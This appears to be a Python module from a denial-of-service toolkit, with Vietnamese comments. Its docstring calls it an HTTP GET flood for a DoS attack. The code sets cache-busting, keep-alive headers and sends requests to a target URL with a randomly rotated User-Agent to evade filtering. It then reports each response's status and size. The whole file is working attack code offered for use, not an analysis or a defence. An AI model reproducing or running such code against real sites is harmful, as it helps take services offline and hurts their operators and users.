"""This module provides the flood function for an HTTP GET request DoS attack."""

import json
import random
import requests
from colorama import Fore as F
from requests.exceptions import Timeout, ConnectionError

# Tải danh sách User-Agent từ file JSON
with open("tools/L7/user_agents.json", "r") as agents:
    user_agents = json.load(agents)["agents"]

# Thiết lập các header chung cho yêu cầu HTTP
headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
}

# Màu hiển thị cho trạng thái phản hồi
color_code = {True: F.GREEN, False: F.RED}

def flood(target: str) -> None:
    """Start an HTTP GET request flood.

    Args:
        target (str): Target's URL

    Returns:
        None
    """
    global headers
    headers["User-agent"] = random.choice(user_agents)

    try:
        # Gửi yêu cầu HTTP GET đến mục tiêu
        response = requests.get(target, headers=headers, timeout=4)
        
        # Hiển thị trạng thái và thông tin dữ liệu nhận được
        status = f"{color_code[response.status_code == 200]}Status: [{response.status_code}]"
        payload_size = f"{F.RESET} Requested Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
        print(f"{status}{F.RESET} --> {payload_size} {F.RESET}")

    except (Timeout, ConnectionError) as e:
        # Hiển thị lỗi kết nối
        print(f"{F.RED}[!] Connection error: {e}{F.RESET}")
